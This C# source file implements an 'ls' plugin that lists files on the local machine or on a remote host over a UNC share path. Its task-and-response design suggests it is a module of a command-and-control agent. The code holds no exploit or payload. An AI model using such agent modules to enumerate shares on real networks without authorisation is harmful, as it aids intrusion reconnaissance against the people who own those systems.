using System.Net;
using Workflow.Contracts;
using Workflow.Utilities;
using Workflow.Models;
using ls;
using System.Text.Json;

namespace Workflow
{
    public class Plugin : IModule
    {

        public string Name => "ls";
        private IDataBroker messageManager { get; set; }

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
        }
        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            LsArgs args = JsonSerializer.Deserialize<LsArgs>(job.task.parameters);

            if(args is null || !args.Validate())
            {
                DebugLog.Log($"{Name} invalid args [{job.task.id}]");
                messageManager.Write("Failed to parse arguments", job.task.id, true, "error");
                return;
            }

            if (string.IsNullOrEmpty(args.host) || args.host.Equals(Dns.GetHostName(), StringComparison.OrdinalIgnoreCase))
            {
                DebugLog.Log($"{Name} listing local path '{args.path}' [{job.task.id}]");
                messageManager.AddTaskResponse(LocalListing.GetLocalListing(args.path, job.task.id));
            }
            else
            {
                DebugLog.Log($"{Name} listing remote host '{args.host}' path '{args.path}' [{job.task.id}]");
                messageManager.AddTaskResponse(RemoteListing.GetRemoteListing(Path.Join("\\\\" + args.host, args.path), args.host, job.task.id));
            }
            DebugLog.Log($"{Name} completed [{job.task.id}]");
        }
    }
}

